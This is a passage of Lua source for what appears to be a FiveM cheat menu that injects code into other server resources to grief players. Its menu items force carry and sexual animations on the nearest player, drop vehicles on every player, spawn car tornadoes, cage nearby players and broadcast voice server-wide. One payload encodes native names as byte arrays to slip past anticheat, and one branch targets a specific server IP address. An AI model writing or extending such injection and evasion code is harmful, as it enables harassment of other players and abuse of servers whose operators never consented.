                        sendNotification("Blame Arrest", "Arresting player", "success", 2000)
                    end
                },
                {
                    label = "Blame Carry",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local function KmXYpTzqLW()
                                local closestPlayer, closestDistance = nil, math.huge
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)

                                for _, playerId in ipairs(GetActivePlayers()) do
                                    local targetPed = GetPlayerPed(playerId)
                                    if targetPed ~= playerPed then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local distance = #(playerCoords - targetCoords)

                                        if distance < closestDistance then
                                            closestDistance = distance
                                            closestPlayer = playerId
                                        end
                                    end
                                end

                                if closestPlayer then
                                    if _G.StarkCarry then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        _G.StarkCarry = false
                                    else
                                        _G.StarkCarry = true
                                        if not HasAnimDictLoaded("nm") then
                                            RequestAnimDict("nm")
                                            while not HasAnimDictLoaded("nm") do
                                                Wait(0)
                                            end
                                        end

                                        local targetPed = GetPlayerPed(closestPlayer)
                                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false,
                false, false, false, 2, false)
                                        TaskPlayAnim(PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false,
                false, false)
                                    end
                                end
                            end
                            KmXYpTzqLW()
                        ]]

                        if canInjectResource() then
                            MachoInjectResource2(3, "monitor", code)
                        else
                            local function KmXYpTzqLW()
                                local closestPlayer, closestDistance = nil, math.huge
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)

                                for _, playerId in ipairs(GetActivePlayers()) do
                                    local targetPed = GetPlayerPed(playerId)
                                    if targetPed ~= playerPed then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local distance = #(playerCoords - targetCoords)

                                        if distance < closestDistance then
                                            closestDistance = distance
                                            closestPlayer = playerId
                                        end
                                    end
                                end

                                if closestPlayer then
                                    if _G.StarkCarry then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        _G.StarkCarry = false
                                    else
                                        _G.StarkCarry = true
                                        if not HasAnimDictLoaded("nm") then
                                            RequestAnimDict("nm")
                                            while not HasAnimDictLoaded("nm") do
                                                Wait(0)
                                            end
                                        end

                                        local targetPed = GetPlayerPed(closestPlayer)
                                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false,
                false, false, false, 2, false)
                                        TaskPlayAnim(PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false,
                false, false)
                                    end
                                end
                            end
                            KmXYpTzqLW()
                        end
                        sendNotification("Blame Carry", "Carrying player", "success", 2000)
                    end
                },
                {
                    label = "Sit On Them",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local function PxKvqLtNYz()
                                local closestPlayer, closestDistance = nil, math.huge
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)

                                for _, playerId in ipairs(GetActivePlayers()) do
                                    local targetPed = GetPlayerPed(playerId)
                                    if targetPed ~= playerPed then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local distance = #(playerCoords - targetCoords)

                                        if distance < closestDistance then
                                            closestDistance = distance
                                            closestPlayer = playerId
                                        end
                                    end
                                end

                                if not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") then
                                    RequestAnimDict("anim@heists@prison_heistunfinished_biztarget_idle")
                                    while not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") do
                                        Wait(0)
                                    end
                                end

                                AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 4103, 0.10, 0.28, 1.0, 0.0, 0.0,
                0.0, false, false, false, false, 2, true)
                                TaskPlayAnim(PlayerPedId(), "anim@heists@prison_heistunfinished_biztarget_idle", "target_idle",
                8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                                TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
                            end
                            PxKvqLtNYz()
                        ]]

                        if canInjectResource() then
                            MachoInjectResource2(3, "monitor", code)
                        else
                            local function PxKvqLtNYz()
                                local closestPlayer, closestDistance = nil, math.huge
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)

                                for _, playerId in ipairs(GetActivePlayers()) do
                                    local targetPed = GetPlayerPed(playerId)
                                    if targetPed ~= playerPed then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local distance = #(playerCoords - targetCoords)

                                        if distance < closestDistance then
                                            closestDistance = distance
                                            closestPlayer = playerId
                                        end
                                    end
                                end

                                if not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") then
                                    RequestAnimDict("anim@heists@prison_heistunfinished_biztarget_idle")
                                    while not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") do
                                        Wait(0)
                                    end
                                end

                                AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 4103, 0.10, 0.28, 1.0, 0.0, 0.0,
                0.0, false, false, false, false, 2, true)
                                TaskPlayAnim(PlayerPedId(), "anim@heists@prison_heistunfinished_biztarget_idle", "target_idle",
                8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                                TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
                            end
                            PxKvqLtNYz()
                        end
                        sendNotification("Sit On Them", "Sitting on player", "success", 2000)
                    end
                },
                {
                    label = "Give Backshots",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local function bXzLqPTMn9()
                                local closestPlayer, closestDistance = nil, math.huge
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)

                                for _, playerId in ipairs(GetActivePlayers()) do
                                    local targetPed = GetPlayerPed(playerId)
                                    if targetPed ~= playerPed then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local distance = #(playerCoords - targetCoords)

                                        if distance < closestDistance then
                                            closestDistance = distance
                                            closestPlayer = playerId
                                        end
                                    end
                                end

                                if closestPlayer then
                                    if _G.StarkDaddy then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        _G.StarkDaddy = false
                                    else
                                        _G.StarkDaddy = true
                                        if not HasAnimDictLoaded("rcmpaparazzo_2") then
                                            RequestAnimDict("rcmpaparazzo_2")
                                            while not HasAnimDictLoaded("rcmpaparazzo_2") do
                                                Wait(0)
                                            end
                                        end

                                        local targetPed = GetPlayerPed(closestPlayer)
                                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0,
                false, false, false, false, 2, true)
                                        TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0,
                false, false, false)
                                        TaskPlayAnim(GetPlayerPed(closestPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5,
                -1, 49, 0, 0, 0, 0)
                                    end
                                end
                            end
                            bXzLqPTMn9()
                        ]]

                        if canInjectResource() then
                            MachoInjectResource2(3, "monitor", code)
                        else
                            local function bXzLqPTMn9()
                                local closestPlayer, closestDistance = nil, math.huge
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)

                                for _, playerId in ipairs(GetActivePlayers()) do
                                    local targetPed = GetPlayerPed(playerId)
                                    if targetPed ~= playerPed then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local distance = #(playerCoords - targetCoords)

                                        if distance < closestDistance then
                                            closestDistance = distance
                                            closestPlayer = playerId
                                        end
                                    end
                                end

                                if closestPlayer then
                                    if _G.StarkDaddy then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        _G.StarkDaddy = false
                                    else
                                        _G.StarkDaddy = true
                                        if not HasAnimDictLoaded("rcmpaparazzo_2") then
                                            RequestAnimDict("rcmpaparazzo_2")
                                            while not HasAnimDictLoaded("rcmpaparazzo_2") do
                                                Wait(0)
                                            end
                                        end

                                        local targetPed = GetPlayerPed(closestPlayer)
                                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0,
                false, false, false, false, 2, true)
                                        TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0,
                false, false, false)
                                        TaskPlayAnim(GetPlayerPed(closestPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5,
                -1, 49, 0, 0, 0, 0)
                                    end
                                end
                            end
                            bXzLqPTMn9()
                        end
                        sendNotification("Backshots", "Giving backshots", "success", 2000)
                    end
                },
                {
                    label = "Detach All Entities",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            function DetachEverything()
                                CreateThread(function()
                                    local myPed = PlayerPedId()
                                    DetachEntity(myPed, true, true)

                                    local players = GetActivePlayers()
                                    for _, pid in ipairs(players) do
                                        local ped = GetPlayerPed(pid)
                                        if ped ~= myPed then
                                            DetachEntity(ped, true, true)
                                        end
                                    end
                                end)
                            end
                            DetachEverything()
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            function DetachEverything()
                                CreateThread(function()
                                    local myPed = PlayerPedId()
                                    DetachEntity(myPed, true, true)

                                    local players = GetActivePlayers()
                                    for _, pid in ipairs(players) do
                                        local ped = GetPlayerPed(pid)
                                        if ped ~= myPed then
                                            DetachEntity(ped, true, true)
                                        end
                                    end
                                end)
                            end
                            DetachEverything()
                        end
                        sendNotification("Detach", "Detached all entities", "success", 2000)
                    end
                },                
            }
        }        
    }
})

table.insert(activeMenu, {
    label = 'Server',
    type = 'submenu',
    tabs = {
        {
            name = 'Main Menu',
            submenu = {
{
                        label = "Rain on All",
                        type = "checkbox",
                        checked = false,
                        onConfirm = function(checked)
                            if checked then
                                openInputDialog("Enter model name:", 50, function(model)
                                    if not model or model == "" then
                                        sendNotification("Rain on All", "No model entered", "error", 2000)
                                        return
                                    end

                                    local serverEndpoint = GetCurrentServerEndpoint()
                                    local targetResource = nil

                                    if GetResourceState("esx_core") == "started" then
                                        targetResource = "esx_core"
                                    elseif GetResourceState("es_extended") == "started" then
                                        targetResource = "es_extended"
                                    end

                                    if GetResourceState("solos-rentals") == "started" then
                                        Injection("solos-rentals", string.format([[
                                            _G.GlobalPlaneStorm = true

                                            function RainOnAllPlanes()
                                                CreateThread(function()
                                                    local function XzRtVbNmQwEr(coords, heading)
                                                        local nMiLoPzXwEq = "%s"
                                                        RequestModel(nMiLoPzXwEq)
                                                        while not HasModelLoaded(nMiLoPzXwEq) do
                                                            Wait(100)
                                                        end

                                                        local xFrEdCvBgTn = CreateVehicle(nMiLoPzXwEq, coords.x,
coords.y, coords.z,
                    heading, true, false)
                                                        local sMnLoKiJpUb =
NetworkGetNetworkIdFromEntity(xFrEdCvBgTn)

                                                        SetEntityAsMissionEntity(xFrEdCvBgTn, true, true)
                                                        SetVehicleOutOfControl(xFrEdCvBgTn, false, false)
                                                        SetVehicleHasBeenOwnedByPlayer(xFrEdCvBgTn, false)
                                                        SetNetworkIdExistsOnAllMachines(sMnLoKiJpUb, true)
                                                        NetworkSetEntityInvisibleToNetwork(xFrEdCvBgTn, false)
                                                        SetNetworkIdCanMigrate(sMnLoKiJpUb, true)
                                                        SetModelAsNoLongerNeeded(nMiLoPzXwEq)

                                                        SetEntityVelocity(xFrEdCvBgTn, 0.0, 0.0, -40.0)
                                                    end

                                                    local hash = GetHashKey("%s")
                                                    RequestModel(hash)
                                                    while not HasModelLoaded(hash) do Wait(0) end

                                                    while _G.GlobalPlaneStorm do
                                                        for _, pid in ipairs(GetActivePlayers()) do
                                                            local ped = GetPlayerPed(pid)
                                                            if DoesEntityExist(ped) then
                                                                local coords = GetEntityCoords(ped)
                                                                coords = vector3(coords.x, coords.y, coords.z +
50.0)
                                                                XzRtVbNmQwEr(coords, 0.0)
                                                            end
                                                            Wait(50)
                                                        end
                                                        Wait(2000)
                                                    end

                                                    SetModelAsNoLongerNeeded(hash)
                                                end)
                                            end

                                            RainOnAllPlanes()
                                        ]], model, model))

                                    elseif GetResourceState("amigo") == "started" then
                                        Injection("adminMenu", string.format([[
                                            _G.GlobalPlaneStorm = true

                                            function RainOnAllPlanes()
                                                CreateThread(function()
                                                    local function XzRtVbNmQwEr(coords, heading)
                                                        local nMiLoPzXwEq = "%s"
                                                        RequestModel(nMiLoPzXwEq)
                                                        while not HasModelLoaded(nMiLoPzXwEq) do Wait(100) end

                                                        local xFrEdCvBgTn = CreateVehicle(nMiLoPzXwEq, coords.x,
coords.y, coords.z,
                    heading, true, false)
                                                        SetEntityVelocity(xFrEdCvBgTn, 0.0, 0.0, -40.0)
                                                    end

                                                    local hash = GetHashKey("%s")
                                                    RequestModel(hash)
                                                    while not HasModelLoaded(hash) do Wait(0) end

                                                    while _G.GlobalPlaneStorm do
                                                        for _, pid in ipairs(GetActivePlayers()) do
                                                            local ped = GetPlayerPed(pid)
                                                            if DoesEntityExist(ped) then
                                                                local coords = GetEntityCoords(ped)
                                                                XzRtVbNmQwEr(vector3(coords.x, coords.y, coords.z +
50.0), 0.0)
                                                            end
                                                            Wait(50)
                                                        end
                                                        Wait(2000)
                                                    end

                                                    SetModelAsNoLongerNeeded(hash)
                                                end)
                                            end

                                            RainOnAllPlanes()
                                        ]], model, model))

                                    elseif targetResource then
                                        Injection(targetResource, string.format([[
                                            _G.GlobalPlaneStorm = true

                                            function RainOnAllPlanes()
                                                CreateThread(function()
                                                    local function XzRtVbNmQwEr(coords, heading)
                                                        local nMiLoPzXwEq = "%s"
                                                        RequestModel(nMiLoPzXwEq)
                                                        while not HasModelLoaded(nMiLoPzXwEq) do Wait(100) end

                                                        local xFrEdCvBgTn = CreateVehicle(nMiLoPzXwEq, coords.x,
coords.y, coords.z,
                    heading, true, false)
                                                        SetEntityVelocity(xFrEdCvBgTn, 0.0, 0.0, -40.0)
                                                    end

                                                    local hash = GetHashKey("%s")
                                                    RequestModel(hash)
                                                    while not HasModelLoaded(hash) do Wait(0) end

                                                    while _G.GlobalPlaneStorm do
                                                        for _, pid in ipairs(GetActivePlayers()) do
                                                            local ped = GetPlayerPed(pid)
                                                            if DoesEntityExist(ped) then
                                                                local coords = GetEntityCoords(ped)
                                                                XzRtVbNmQwEr(vector3(coords.x, coords.y, coords.z +
50.0), 0.0)
                                                            end
                                                            Wait(50)
                                                        end
                                                        Wait(2000)
                                                    end

                                                    SetModelAsNoLongerNeeded(hash)
                                                end)
                                            end

                                            RainOnAllPlanes()
                                        ]], model, model))

                                    elseif GetResourceState("qb-core") == "started" then
                                        Injection("qb-core", string.format([[
                                            _G.GlobalPlaneStorm = true

                                            function RainOnAllPlanes()
                                                CreateThread(function()
                                                    local function XzRtVbNmQwEr(coords, heading)
                                                        local nMiLoPzXwEq = "%s"
                                                        RequestModel(nMiLoPzXwEq)
                                                        while not HasModelLoaded(nMiLoPzXwEq) do Wait(100) end

                                                        local xFrEdCvBgTn = CreateVehicle(nMiLoPzXwEq, coords.x,
coords.y, coords.z,
                    heading, true, false)
                                                        SetEntityVelocity(xFrEdCvBgTn, 0.0, 0.0, -40.0)
                                                    end

                                                    local hash = GetHashKey("%s")
                                                    RequestModel(hash)
                                                    while not HasModelLoaded(hash) do Wait(0) end

                                                    while _G.GlobalPlaneStorm do
                                                        for _, pid in ipairs(GetActivePlayers()) do
                                                            local ped = GetPlayerPed(pid)
                                                            if DoesEntityExist(ped) then
                                                                local coords = GetEntityCoords(ped)
                                                                XzRtVbNmQwEr(vector3(coords.x, coords.y, coords.z +
50.0), 0.0)
                                                            end
                                                            Wait(50)
                                                        end
                                                        Wait(2000)
                                                    end

                                                    SetModelAsNoLongerNeeded(hash)
                                                end)
                                            end

                                            RainOnAllPlanes()
                                        ]], model, model))

                                    elseif serverEndpoint:match("([^:]+)") == "185.244.106.12" and
GetResourceState("drc_gardener") ==
                    "started" then
                                        Injection("drc_gardener", string.format([[
                                            _G.GlobalPlaneStorm = true

                                            function RainOnAllPlanes()
                                                CreateThread(function()
                                                    local function XzRtVbNmQwEr(coords, heading)
                                                        local nMiLoPzXwEq = "%s"
                                                        RequestModel(nMiLoPzXwEq)
                                                        while not HasModelLoaded(nMiLoPzXwEq) do Wait(100) end

                                                        local xFrEdCvBgTn = CreateVehicle(nMiLoPzXwEq, coords.x,
coords.y, coords.z,
                    heading, true, false)
                                                        SetEntityVelocity(xFrEdCvBgTn, 0.0, 0.0, -40.0)
                                                    end

                                                    local hash = GetHashKey("%s")
                                                    RequestModel(hash)
                                                    while not HasModelLoaded(hash) do Wait(0) end

                                                    while _G.GlobalPlaneStorm do
                                                        for _, pid in ipairs(GetActivePlayers()) do
                                                            local ped = GetPlayerPed(pid)
                                                            if DoesEntityExist(ped) then
                                                                local coords = GetEntityCoords(ped)
                                                                XzRtVbNmQwEr(vector3(coords.x, coords.y, coords.z +
50.0), 0.0)
                                                            end
                                                            Wait(50)
                                                        end
                                                        Wait(2000)
                                                    end

                                                    SetModelAsNoLongerNeeded(hash)
                                                end)
                                            end

                                            RainOnAllPlanes()
                                        ]], model, model))

                                    elseif GetResourceState("lunar_bridge") == "started" then
                                        Injection("lunar_bridge", string.format([[
                                            _G.GlobalPlaneStorm = true

                                            function RainOnAllPlanes()
                                                CreateThread(function()
                                                    local function XzRtVbNmQwEr(coords, heading)
                                                        local nMiLoPzXwEq = "%s"
                                                        RequestModel(nMiLoPzXwEq)
                                                        while not HasModelLoaded(nMiLoPzXwEq) do Wait(100) end

                                                        local xFrEdCvBgTn = CreateVehicle(nMiLoPzXwEq, coords.x,
coords.y, coords.z,
                    heading, true, false)
                                                        SetEntityVelocity(xFrEdCvBgTn, 0.0, 0.0, -40.0)
                                                    end

                                                    local hash = GetHashKey("%s")
                                                    RequestModel(hash)
                                                    while not HasModelLoaded(hash) do Wait(0) end

                                                    while _G.GlobalPlaneStorm do
                                                        for _, pid in ipairs(GetActivePlayers()) do
                                                            local ped = GetPlayerPed(pid)
                                                            if DoesEntityExist(ped) then
                                                                local coords = GetEntityCoords(ped)
                                                                XzRtVbNmQwEr(vector3(coords.x, coords.y, coords.z +
50.0), 0.0)
                                                            end
                                                            Wait(50)
                                                        end
                                                        Wait(2000)
                                                    end

                                                    SetModelAsNoLongerNeeded(hash)
                                                end)
                                            end

                                            RainOnAllPlanes()
                                        ]], model, model))

                                    elseif GetResourceState("lation_laundering") == "started" then
                                        Injection("lation_laundering", string.format([[
                                            _G.GlobalPlaneStorm = true

                                            function RainOnAllPlanes()
                                                CreateThread(function()
                                                    local function XzRtVbNmQwEr(coords, heading)
                                                        local nMiLoPzXwEq = "%s"
                                                        RequestModel(nMiLoPzXwEq)
                                                        while not HasModelLoaded(nMiLoPzXwEq) do Wait(100) end

                                                        local xFrEdCvBgTn = CreateVehicle(nMiLoPzXwEq, coords.x,
coords.y, coords.z,
                    heading, true, false)
                                                        SetEntityVelocity(xFrEdCvBgTn, 0.0, 0.0, -40.0)
                                                    end

                                                    local hash = GetHashKey("%s")
                                                    RequestModel(hash)
                                                    while not HasModelLoaded(hash) do Wait(0) end

                                                    while _G.GlobalPlaneStorm do
                                                        for _, pid in ipairs(GetActivePlayers()) do
                                                            local ped = GetPlayerPed(pid)
                                                            if DoesEntityExist(ped) then
                                                                local coords = GetEntityCoords(ped)
                                                                XzRtVbNmQwEr(vector3(coords.x, coords.y, coords.z +
50.0), 0.0)
                                                            end
                                                            Wait(50)
                                                        end
                                                        Wait(2000)
                                                    end

                                                    SetModelAsNoLongerNeeded(hash)
                                                end)
                                            end

                                            RainOnAllPlanes()
                                        ]], model, model))

                                    elseif GetResourceState("monitor") == "started" or GetResourceState("ox_lib") ==
 "started" then
                                        local function b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return "{" .. table.concat(t, ",") .. "}"
                                        end

                                        local modelLit = b(model)

                                        local payload = string.format([[
                                            local d = function(t)
                                                local s = ""
                                                for i = 1, #t do s = s .. string.char(t[i]) end
                                                return s
                                            end
                                            local g = function(e) return _G[d(e)] end

                                            _G.GlobalPlaneStorm = true

                                            CreateThread(function()
                                                local function XzRtVbNmQwEr(coords, heading)
                                                    local nMiLoPzXwEq = d(%s)
                                                    local hash =
g({71,101,116,72,97,115,104,75,101,121})(nMiLoPzXwEq)
                                                    g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                                                    while not
g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    Citizen.Wait(100) end

                                                    local xFrEdCvBgTn =
g({67,114,101,97,116,101,86,101,104,105,99,108,101})(hash,
                    coords.x, coords.y, coords.z, heading, true, false)

g({83,101,116,69,110,116,105,116,121,86,101,108,111,99,105,116,121})(xFrEdCvBgTn,
                    0.0, 0.0, -40.0)
                                                end

                                                local hash = g({71,101,116,72,97,115,104,75,101,121})(d(%s))
                                                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                                                while not
g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    Citizen.Wait(0) end

                                                while _G.GlobalPlaneStorm do
                                                    for _, pid in
                    ipairs(g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()) do
                                                        local ped =
g({71,101,116,80,108,97,121,101,114,80,101,100})(pid)
                                                        if
g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                                                            local coords =
                    g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                                                            XzRtVbNmQwEr(vector3(coords.x, coords.y, coords.z +
50.0), 0.0)
                                                        end
                                                        Citizen.Wait(50)
                                                    end
                                                    Citizen.Wait(2000)
                                                end



g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(hash)
                                            end)
                                        ]], modelLit, modelLit)

                                        pcall(MachoInjectResourceRaw, "monitor", payload)

                                    elseif GetResourceState("lb-phone") == "started" then
                                        Injection("lb-phone", string.format([[
                                            _G.GlobalPlaneStorm = true

                                            function RainOnAllPlanes()
                                                CreateThread(function()
                                                    local function XzRtVbNmQwEr(coords, heading)
                                                        local nMiLoPzXwEq = "%s"
                                                        RequestModel(nMiLoPzXwEq)
                                                        while not HasModelLoaded(nMiLoPzXwEq) do Wait(100) end

                                                        local xFrEdCvBgTn = CreateVehicle(nMiLoPzXwEq, coords.x,
coords.y, coords.z,
                    heading, true, false)
                                                        SetEntityVelocity(xFrEdCvBgTn, 0.0, 0.0, -40.0)
                                                    end

                                                    local hash = GetHashKey("%s")
                                                    RequestModel(hash)
                                                    while not HasModelLoaded(hash) do Wait(0) end

                                                    while _G.GlobalPlaneStorm do
                                                        for _, pid in ipairs(GetActivePlayers()) do
                                                            local ped = GetPlayerPed(pid)
                                                            if DoesEntityExist(ped) then
                                                                local coords = GetEntityCoords(ped)
                                                                XzRtVbNmQwEr(vector3(coords.x, coords.y, coords.z +
50.0), 0.0)
                                                            end
                                                            Wait(50)
                                                        end
                                                        Wait(2000)
                                                    end

                                                    SetModelAsNoLongerNeeded(hash)
                                                end)
                                            end

                                            RainOnAllPlanes()
                                        ]], model, model))

                                    else
                                        local fallback = enviGetStartedFallbackResource()
                                        if fallback then
                                            Injection(fallback, string.format([[
                                                _G.GlobalPlaneStorm = true

                                                function RainOnAllPlanes()
                                                    CreateThread(function()
                                                        local function XzRtVbNmQwEr(coords, heading)
                                                            local nMiLoPzXwEq = "%s"
                                                            RequestModel(nMiLoPzXwEq)
                                                            while not HasModelLoaded(nMiLoPzXwEq) do Wait(100) end

                                                            local xFrEdCvBgTn = CreateVehicle(nMiLoPzXwEq, coords.x,
 coords.y,
                    coords.z, heading, true, false)
                                                            SetEntityVelocity(xFrEdCvBgTn, 0.0, 0.0, -40.0)
                                                        end

                                                        local hash = GetHashKey("%s")
                                                        RequestModel(hash)
                                                        while not HasModelLoaded(hash) do Wait(0) end

                                                        while _G.GlobalPlaneStorm do
                                                            for _, pid in ipairs(GetActivePlayers()) do
                                                                local ped = GetPlayerPed(pid)
                                                                if DoesEntityExist(ped) then
                                                                    local coords = GetEntityCoords(ped)
                                                                    XzRtVbNmQwEr(vector3(coords.x, coords.y,
coords.z + 50.0), 0.0)
                                                                end
                                                                Wait(50)
                                                            end
                                                            Wait(2000)
                                                        end

                                                        SetModelAsNoLongerNeeded(hash)
                                                    end)
                                                end

                                                RainOnAllPlanes()
                                            ]], model, model))
                                        else
                                            sendNotification("Rain on All", "No compatible resource found", "error",
 3000)
                                            return
                                        end
                                    end

                                    sendNotification("Rain on All", "Started raining " .. model, "success", 2000)
                                end)
                            else
                                _G.GlobalPlaneStorm = false
                                sendNotification("Rain on All", "Stopped", "info", 2000)
                            end
                        end
                    },
                {
                    label = "Car Tornado",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.CarTornadoActive = true
                                _G.CarTornadoRunning = false

                                function StartCarTornadoController()
                                    CreateThread(function()
                                        while _G.CarTornadoActive do
                                            if IsControlJustPressed(0, 20) then
                                                _G.CarTornadoRunning = not _G.CarTornadoRunning
                                            end

                                            if _G.CarTornadoRunning then
                                                local coords = GetEntityCoords(PlayerPedId())
                                                for i = 1, 5 do
                                                    local x = coords.x + math.random(-10, 10)
                                                    local y = coords.y + math.random(-10, 10)
                                                    local z = coords.z + math.random(5, 15)
                                                    local vehHash = GetHashKey("adder")
                                                    RequestModel(vehHash)
                                                    while not HasModelLoaded(vehHash) do Wait(0) end
                                                    local veh = CreateVehicle(vehHash, x, y, z, 0.0, true, true)
                                                    SetEntityVelocity(veh, math.random(-10,10)*1.0, math.random(-10,10)*1.0,
                math.random(10,20)*1.0)
                                                    SetEntityRotation(veh, math.random(0,360)*1.0, math.random(0,360)*1.0,
                math.random(0,360)*1.0, 2, true)
                                                    SetVehicleEngineOn(veh, true, true, false)
                                                end
                                                Wait(2000)
                                            else
                                                Wait(0)
                                            end
                                        end
                                    end)
                                end

                                StartCarTornadoController()
                            ]]

                            if canInjectResource() then
                                MachoInjectResource2(3, "monitor", code)
                            end
                            sendNotification("Car Tornado", "Enabled (Z to toggle)", "success", 2000)
                        else
                            if canInjectResource() then
                                MachoInjectResource2(3, "monitor", [[_G.CarTornadoActive = false]])
                            else
                                _G.CarTornadoActive = false
                            end
                            sendNotification("Car Tornado", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Change Nearest Vehicle Plate",
                    type = "button",
                    onConfirm = function()
                        openInputDialog("Enter plate text:", 50, function(plateText)
                            if not plateText or plateText == "" then
                                sendNotification("Change Plate", "Invalid plate text", "error", 2000)
                                return
                            end

                            local function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)

                            CreateThread(function()
                                local ped = PlayerPedId()
                                local coords = GetEntityCoords(ped)
                                local currentVehicle = GetVehiclePedIsIn(ped, false)
                                local vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 5.0, 0, 71)

                                if vehicle == 0 or vehicle == currentVehicle or not DoesEntityExist(vehicle) then
                                    sendNotification("Change Plate", "No vehicle found nearby", "error", 2000)
                                    return
                                end

                                for i = 1, 50 do
                                    if NetworkHasControlOfEntity(vehicle) then break end
                                    NetworkRequestControlOfEntity(vehicle)
                                    Wait(10)
                                end

                                SetVehicleNumberPlateText(vehicle, plateText)
                                sendNotification("Change Plate", "Plate set to: " .. plateText, "success", 2000)
                            end)
                        end)
                    end
                },
                {
                    label = "Talk To Everyone",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.VoiceGlobalActive = true

                                function StartGlobalVoice()
                                    CreateThread(function()
                                        while _G.VoiceGlobalActive do
                                            MumbleSetTalkerProximity(999.0)
                                            NetworkSetTalkerProximity(999.0)
                                            Wait(1)
                                        end
                                    end)
                                end

                                StartGlobalVoice()
                            ]]

                            if canInjectResource() then
                                MachoInjectResource2(3, "es_extended", code)
                            end
                            sendNotification("Talk To Everyone", "Enabled", "success", 2000)
                        else
                            local code = [[
                                _G.VoiceGlobalActive = false
                                MumbleSetTalkerProximity(10.0)
                                NetworkSetTalkerProximity(10.0)
                            ]]

                            if canInjectResource() then
                                MachoInjectResource2(3, "es_extended", code)
                            end
                            sendNotification("Talk To Everyone", "Disabled", "info", 2000)
                        end
                    end
                },

                {
                    label = "Cage All Nearby",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            function MoonCageAllNearby()
                                CreateThread(function()
                                    local model = "prop_gold_cont_01"
                                    local modelHash = GetHashKey(model)
                                    RequestModel(modelHash)
                                    while not HasModelLoaded(modelHash) do Wait(0) end

                                    local myId = PlayerId()
                                    local myCoords = GetEntityCoords(PlayerPedId())

                                    for _, pid in ipairs(GetActivePlayers()) do
                                        if pid ~= myId then
                                            local targetPed = GetPlayerPed(pid)
                                            if DoesEntityExist(targetPed) then
                                                local coords = GetEntityCoords(targetPed)
                                                if #(coords - myCoords) <= 30.0 then
                                                    local obj = CreateObjectNoOffset(modelHash, coords.x, coords.y, coords.z -
                1.0, true, true, false)

                                                    SetEntityAsMissionEntity(obj, true, true)
                                                    FreezeEntityPosition(obj, true)
                                                    SetEntityDynamic(obj, false)
                                                    PlaceObjectOnGroundProperly(obj)
                                                    SetModelAsNoLongerNeeded(modelHash)

                                                    local netId = ObjToNet(obj)
